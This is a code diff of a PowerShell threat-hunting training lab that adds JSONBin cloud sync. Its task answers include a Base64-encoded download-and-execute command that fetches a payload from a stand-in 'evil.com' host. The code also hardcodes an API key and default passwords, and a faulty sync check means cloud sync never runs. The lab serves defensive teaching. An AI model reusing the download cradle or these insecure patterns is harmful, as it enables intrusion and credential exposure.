@@ -159,12 +159,13 @@
       font-family: 'Fira Code', monospace; font-size: 0.8rem;
       color: #66ff8a; margin: 0.4rem 0;
     }
-    .storage-notice {
-      background: #0a1a0f; border: 1px solid #ffaa00;
-      padding: 0.5rem; border-radius: 0.8rem;
-      font-size: 0.7rem; color: #ffcc66; margin-bottom: 1rem;
-      text-align: center;
+    .sync-status {
+      display: inline-block; padding: 0.2rem 0.6rem; border-radius: 1rem;
+      font-size: 0.7rem; margin-left: 0.5rem;
     }
+    .sync-online { background: #103a10; color: #66ff8a; border: 1px solid #4dff80; }
+    .sync-offline { background: #3a1a1a; color: #ffaa66; border: 1px solid #ff8800; }
+    .sync-error { background: #3a1010; color: #ff6666; border: 1px solid #ff4444; }
   </style>
 </head>
 <body>
@@ -172,9 +173,6 @@
   <div id="loginSection">
     <h1>⚡ PS NO-LOG HUNTER</h1>
     <div class="subtitle">PowerShell Without ScriptBlock Logging · Alternative Detection</div>
-    <div class="storage-notice">
-      💾 <b>Note:</b> All data is stored in your browser's localStorage. Each browser/device has its own separate storage. Changes made on one device won't affect others.
-    </div>
     <div class="panel">
       <div class="flex-row" style="justify-content: center;">
         <button id="studentLoginBtn">🎓 Student Access</button>
@@ -204,7 +202,7 @@
 
   <div id="adminDashboard" class="hidden">
     <div style="display:flex; justify-content:space-between;">
-      <h2 style="color:#6aff90;">🛡️ ADMINISTRATOR</h2>
+      <h2 style="color:#6aff90;">🛡️ ADMINISTRATOR <span id="syncStatusBadge" class="sync-status sync-online">☁️ Synced</span></h2>
       <button id="logoutAdminBtn">Exit</button>
     </div>
     <div class="panel">
@@ -222,7 +220,8 @@
         <button id="updateAdminPasswordBtn">Update</button>
       </div>
       <hr style="border-color:#2a5a3a; margin:1.2rem 0;">
-      <h3>📋 Student Progress</h3>
+      <h3>📋 Student Progress (Synced Across Devices)</h3>
+      <button id="refreshStudentListBtn" style="margin-bottom:0.5rem;">🔄 Refresh List</button>
       <div id="adminStudentList"></div>
       <button id="resetAllProgressBtn" style="background:#3a1a1a; border-color:#aa3030; margin-top:1rem;">⚠️ Reset All Student Progress</button>
     </div>
@@ -231,23 +230,145 @@
 
 <script>
 (function() {
-    // Storage keys with unique namespace
-    const ADMIN_PASS_KEY = 'pslog_admin_pass_v4';
-    const STUDENT_PASS_KEY = 'pslog_student_pass_v4';
-    const STUDENTS_DB_KEY = 'pslog_students_db_v4';
-    const INITIALIZED_KEY = 'pslog_initialized_v4';
+    // ============ CLOUD STORAGE CONFIGURATION ============
+    // Using JSONBin.io for free cloud-synced storage
+    // Create a free bin at https://jsonbin.io and replace BIN_ID and API_KEY
+    const JSONBIN_BIN_ID = '6a130a456610dd3ae89a47bd'; // Replace with your bin ID
+    const JSONBIN_API_KEY = '$2a$10$5rT7.HXI3Rwy1eQetTlcWejW6Lra.K5qow438ivngHdQNyTYWSt9i'; // Replace with your API key
+    const JSONBIN_URL = `https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`;
+    
+    // Fallback: Use localStorage if JSONBin is not configured
+    const USE_CLOUD_STORAGE = JSONBIN_BIN_ID !== '6a130a456610dd3ae89a47bd';
+    
+    // Local storage keys (used as fallback or for caching)
+    const ADMIN_PASS_KEY = 'pslog_admin_pass_v5';
+    const STUDENT_PASS_KEY = 'pslog_student_pass_v5';
+    const STUDENTS_DB_KEY = 'pslog_students_db_v5';
     
     const DEFAULT_ADMIN_PASS = 'admin123';
     const DEFAULT_STUDENT_PASS = 'pslog2025';
+    
+    // In-memory cache
+    let cloudData = {
+      adminPass: DEFAULT_ADMIN_PASS,
+      studentPass: DEFAULT_STUDENT_PASS,
+      students: []
+    };
+    let syncStatus = 'online'; // online, offline, error
+    let lastSyncTime = null;
 
-    // Initialize only if never initialized before
-    if (!localStorage.getItem(INITIALIZED_KEY)) {
-        if (!localStorage.getItem(ADMIN_PASS_KEY)) localStorage.setItem(ADMIN_PASS_KEY, DEFAULT_ADMIN_PASS);
-        if (!localStorage.getItem(STUDENT_PASS_KEY)) localStorage.setItem(STUDENT_PASS_KEY, DEFAULT_STUDENT_PASS);
-        if (!localStorage.getItem(STUDENTS_DB_KEY)) localStorage.setItem(STUDENTS_DB_KEY, JSON.stringify([]));
-        localStorage.setItem(INITIALIZED_KEY, 'true');
+    // ============ CLOUD STORAGE FUNCTIONS ============
+    async function loadFromCloud() {
+      if (!USE_CLOUD_STORAGE) {
+        // Fallback to localStorage
+        cloudData.adminPass = localStorage.getItem(ADMIN_PASS_KEY) || DEFAULT_ADMIN_PASS;
+        cloudData.studentPass = localStorage.getItem(STUDENT_PASS_KEY) || DEFAULT_STUDENT_PASS;
+        try { cloudData.students = JSON.parse(localStorage.getItem(STUDENTS_DB_KEY) || '[]'); } 
+        catch(e) { cloudData.students = []; }
+        syncStatus = 'offline';
+        updateSyncBadge();
+        return;
+      }
+      
+      try {
+        const response = await fetch(JSONBIN_URL + '/latest', {
+          headers: { 'X-Master-Key': JSONBIN_API_KEY }
+        });
+        
+        if (response.ok) {
+          const data = await response.json();
+          cloudData = data.record;
+          syncStatus = 'online';
+          lastSyncTime = new Date();
+          
+          // Cache to localStorage as backup
+          localStorage.setItem(ADMIN_PASS_KEY, cloudData.adminPass || DEFAULT_ADMIN_PASS);
+          localStorage.setItem(STUDENT_PASS_KEY, cloudData.studentPass || DEFAULT_STUDENT_PASS);
+          localStorage.setItem(STUDENTS_DB_KEY, JSON.stringify(cloudData.students || []));
+        } else {
+          syncStatus = 'error';
+          loadFromLocalFallback();
+        }
+      } catch(e) {
+        syncStatus = 'error';
+        loadFromLocalFallback();
+      }
+      updateSyncBadge();
     }
 
+    function loadFromLocalFallback() {
+      cloudData.adminPass = localStorage.getItem(ADMIN_PASS_KEY) || DEFAULT_ADMIN_PASS;
+      cloudData.studentPass = localStorage.getItem(STUDENT_PASS_KEY) || DEFAULT_STUDENT_PASS;
+      try { cloudData.students = JSON.parse(localStorage.getItem(STUDENTS_DB_KEY) || '[]'); } 
+      catch(e) { cloudData.students = []; }
+    }
+
+    async function saveToCloud() {
+      // Always save to localStorage as backup
+      localStorage.setItem(ADMIN_PASS_KEY, cloudData.adminPass);
+      localStorage.setItem(STUDENT_PASS_KEY, cloudData.studentPass);
+      localStorage.setItem(STUDENTS_DB_KEY, JSON.stringify(cloudData.students));
+      
+      if (!USE_CLOUD_STORAGE) {
+        syncStatus = 'offline';
+        updateSyncBadge();
+        return;
+      }
+      
+      try {
+        const response = await fetch(JSONBIN_URL, {
+          method: 'PUT',
+          headers: {
+            'Content-Type': 'application/json',
+            'X-Master-Key': JSONBIN_API_KEY
+          },
+          body: JSON.stringify(cloudData)
+        });
+        
+        if (response.ok) {
+          syncStatus = 'online';
+          lastSyncTime = new Date();
+        } else {
+          syncStatus = 'error';
+        }
+      } catch(e) {
+        syncStatus = 'error';
+      }
+      updateSyncBadge();
+    }
+
+    function updateSyncBadge() {
+      const badge = document.getElementById('syncStatusBadge');
+      if (!badge) return;
+      badge.className = 'sync-status';
+      if (syncStatus === 'online') {
+        badge.classList.add('sync-online');
+        badge.textContent = '☁️ Synced';
+      } else if (syncStatus === 'offline') {
+        badge.classList.add('sync-offline');
+        badge.textContent = '💾 Local Only';
+      } else {
+        badge.classList.add('sync-error');
+        badge.textContent = '⚠️ Offline';
+      }
+    }
+
+    // ============ DATA ACCESS FUNCTIONS ============
+    function getStudents() { return cloudData.students || []; }
+    function saveStudents(arr) { cloudData.students = arr; saveToCloud(); }
+    function getStudentPassword() { return cloudData.studentPass || DEFAULT_STUDENT_PASS; }
+    function getAdminPassword() { return cloudData.adminPass || DEFAULT_ADMIN_PASS; }
+    
+    async function setStudentPassword(pass) { 
+      cloudData.studentPass = pass; 
+      await saveToCloud(); 
+    }
+    async function setAdminPassword(pass) { 
+      cloudData.adminPass = pass; 
+      await saveToCloud(); 
+    }
+
+    // ============ STATE ============
     let currentUser = null;
     let adminActive = false;
     let loggingEnabled = false;
@@ -255,9 +376,9 @@
     const tasks = [
       { id: 1, title: "🔍 Task 1: Identify Registry Key", desc: "Which registry value controls ScriptBlock logging? (format: ValueName = X)", answer: "EnableScriptBlockLogging = 0" },
       { id: 2, title: "📋 Task 2: Alternative Event IDs", desc: "Select the TWO event IDs to hunt PowerShell without ScriptBlock logs", answer: "4688, 400", extra: "eventIds" },
-      { id: 3, title: "⚠️ Task 3: Suspicious PowerShell Command", desc: "From Event 4688 logs, find the suspicious encoded command (copy exact command starting with 'powershell')", answer: "powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAnACkA", extra: "processLogs" },
+      { id: 3, title: "⚠️ Task 3: Suspicious PowerShell Command", desc: "From Event 4688 logs, find the suspicious encoded command", answer: "powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAnACkA", extra: "processLogs" },
       { id: 4, title: "🔓 Task 4: Decode the Command", desc: "The encoded command decodes to what action? (three words)", answer: "download malicious payload", extra: "decoder" },
-      { id: 5, title: "🛡️ Task 5: GPO Remediation", desc: "What GPO setting enables ScriptBlock logging? (exact path with = Enabled)", answer: "Computer\\Administrative Templates\\Windows Components\\Windows PowerShell\\Turn on Script Block Logging = Enabled", extra: "gpo" }
+      { id: 5, title: "🛡️ Task 5: GPO Remediation", desc: "What GPO setting enables ScriptBlock logging?", answer: "Computer\\Administrative Templates\\Windows Components\\Windows PowerShell\\Turn on Script Block Logging = Enabled", extra: "gpo" }
     ];
 
     const processLogs = [
@@ -277,15 +398,6 @@
       { id: "5156", label: "5156 - Network Connection" }
     ];
 
-    // Safe localStorage getters
-    function getStudents() { 
-      try { const d = localStorage.getItem(STUDENTS_DB_KEY); return d ? JSON.parse(d) : []; } 
-      catch(e) { return []; } 
-    }
-    function saveStudents(arr) { localStorage.setItem(STUDENTS_DB_KEY, JSON.stringify(arr)); }
-    function getStudentPassword() { return localStorage.getItem(STUDENT_PASS_KEY) || DEFAULT_STUDENT_PASS; }
-    function getAdminPassword() { return localStorage.getItem(ADMIN_PASS_KEY) || DEFAULT_ADMIN_PASS; }
-
     function showToast(message, isError = false) {
       const existing = document.querySelector('.toast');
       if (existing) existing.remove();
@@ -299,7 +411,7 @@
       setTimeout(() => { if (toast.parentNode) toast.remove(); }, 3000);
     }
 
-    function updateCompletion(name, taskId) {
+    async function updateCompletion(name, taskId) {
       let students = getStudents();
       let s = students.find(s => s.name.toLowerCase() === name.toLowerCase());
       if (s && !s.completedTasks.includes(taskId)) {
@@ -373,7 +485,6 @@
     window.toggleLogging = function(enabled) {
       loggingEnabled = enabled;
       renderTasks();
-      showToast(enabled ? '✅ ScriptBlock logging ENABLED' : '❌ ScriptBlock logging DISABLED');
     };
 
     window.submitEventIds = function() {
@@ -383,13 +494,13 @@
       const correctSet = new Set(["4688", "400"]);
       if (selected.length === 2 && selected.every(id => correctSet.has(id))) {
         updateCompletion(currentUser.name, 2);
-        showToast('✅ Correct! 4688 and 400.'); renderTasks();
+        showToast('✅ Correct!'); renderTasks();
       } else {
         showToast('❌ Need exactly 4688 and 400.', true);
       }
     };
 
-    window.submitTask = function(taskId) {
+    window.submitTask = async function(taskId) {
       if (!currentUser) return;
       const input = document.getElementById(`answerInput${taskId}`);
       if (!input) return;
@@ -402,7 +513,7 @@
         isCorrect = isCorrect || (la.includes('download') && (la.includes('malicious') || la.includes('payload')));
       }
       if (isCorrect) {
-        updateCompletion(currentUser.name, taskId);
+        await updateCompletion(currentUser.name, taskId);
         showToast('✅ Correct!'); renderTasks();
       } else {
         showToast('❌ Incorrect.', true);
@@ -434,18 +545,25 @@
       ['studentDashboard','adminDashboard','studentLoginForm','adminLoginForm'].forEach(id => document.getElementById(id).classList.add('hidden'));
       currentUser = null; adminActive = false;
     }
-    function showStudentDash() {
-      ['loginSection','adminDashboard'].forEach(id => document.getElementById(id).classList.add('hidden'));
+    async function showStudentDash() {
+      await loadFromCloud();
+      document.getElementById('loginSection').classList.add('hidden');
       document.getElementById('studentDashboard').classList.remove('hidden');
+      document.getElementById('adminDashboard').classList.add('hidden');
       renderTasks();
     }
-    function showAdminDash() {
-      ['loginSection','studentDashboard'].forEach(id => document.getElementById(id).classList.add('hidden'));
+    async function showAdminDash() {
+      await loadFromCloud();
+      document.getElementById('loginSection').classList.add('hidden');
+      document.getElementById('studentDashboard').classList.add('hidden');
       document.getElementById('adminDashboard').classList.remove('hidden');
       renderAdminList();
     }
 
-    document.addEventListener('DOMContentLoaded', () => {
+    document.addEventListener('DOMContentLoaded', async () => {
+      // Initial load
+      await loadFromCloud();
+      
       document.getElementById('studentLoginBtn').addEventListener('click', () => {
         document.getElementById('studentLoginForm').classList.remove('hidden');
         document.getElementById('adminLoginForm').classList.add('hidden');
@@ -454,11 +572,12 @@
         document.getElementById('adminLoginForm').classList.remove('hidden');
         document.getElementById('studentLoginForm').classList.add('hidden');
       });
-      document.getElementById('studentSubmitLogin').addEventListener('click', () => {
+      document.getElementById('studentSubmitLogin').addEventListener('click', async () => {
         const name = document.getElementById('studentNameInput').value.trim();
         const pass = document.getElementById('studentPassInput').value.trim();
         if (!name||!pass) { showToast('Enter name and password.', true); return; }
         if (pass !== getStudentPassword()) { showToast('Invalid student password.', true); return; }
+        await loadFromCloud();
         let students = getStudents();
         let stu = students.find(s => s.name.toLowerCase() === name.toLowerCase());
         if (!stu) { stu = {name, completedTasks:[]}; students.push(stu); saveStudents(students); showToast(`Welcome, ${name}!`); }
@@ -466,35 +585,46 @@
         currentUser = {name: stu.name, completedTasks: [...stu.completedTasks]};
         document.getElementById('studentNameInput').value = '';
         document.getElementById('studentPassInput').value = '';
-        showStudentDash();
+        await showStudentDash();
       });
-      document.getElementById('adminSubmitLogin').addEventListener('click', () => {
-        if (document.getElementById('adminPassInput').value.trim() === getAdminPassword()) {
+      document.getElementById('adminSubmitLogin').addEventListener('click', async () => {
+        const pass = document.getElementById('adminPassInput').value.trim();
+        await loadFromCloud();
+        if (pass === getAdminPassword()) {
           adminActive = true; document.getElementById('adminPassInput').value = '';
-          showToast('Admin access granted.'); showAdminDash();
+          showToast('Admin access granted.'); await showAdminDash();
         } else { showToast('Invalid admin password.', true); }
       });
       document.getElementById('logoutStudentBtn').addEventListener('click', () => { showToast('Logged out.'); showLogin(); });
       document.getElementById('logoutAdminBtn').addEventListener('click', () => { showToast('Admin logged out.'); showLogin(); });
-      document.getElementById('updateStudentPasswordBtn').addEventListener('click', () => {
+      document.getElementById('updateStudentPasswordBtn').addEventListener('click', async () => {
         if (!adminActive) return;
         const np = document.getElementById('newStudentPassword').value.trim();
         if (!np) { showToast('Enter password.', true); return; }
-        localStorage.setItem(STUDENT_PASS_KEY, np);
-        showToast('✅ Student password updated!');
+        await setStudentPassword(np);
+        showToast('✅ Student password updated! Synced to cloud.');
         document.getElementById('newStudentPassword').value = ''; renderAdminList();
       });
-      document.getElementById('updateAdminPasswordBtn').addEventListener('click', () => {
+      document.getElementById('updateAdminPasswordBtn').addEventListener('click', async () => {
         if (!adminActive) return;
         const np = document.getElementById('newAdminPassword').value.trim();
         if (!np) { showToast('Enter password.', true); return; }
-        localStorage.setItem(ADMIN_PASS_KEY, np);
-        showToast('✅ Admin password changed!');
+        await setAdminPassword(np);
+        showToast('✅ Admin password changed! Synced to cloud.');
         document.getElementById('newAdminPassword').value = ''; renderAdminList();
       });
-      document.getElementById('resetAllProgressBtn').addEventListener('click', () => {
+      document.getElementById('refreshStudentListBtn').addEventListener('click', async () => {
+        await loadFromCloud();
+        renderAdminList();
+        showToast('🔄 Student list refreshed from cloud.');
+      });
+      document.getElementById('resetAllProgressBtn').addEventListener('click', async () => {
         if (!adminActive) return;
-        if (confirm('Reset all student progress?')) { saveStudents([]); showToast('Progress reset.'); renderAdminList(); }
+        if (confirm('Reset all student progress? This syncs across all devices.')) { 
+          saveStudents([]); 
+          showToast('Progress reset. Synced to cloud.'); 
+          renderAdminList(); 
+        }
       });
       const s = document.createElement('style');
       s.textContent = '@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-10px)}75%{transform:translateX(10px)}}';
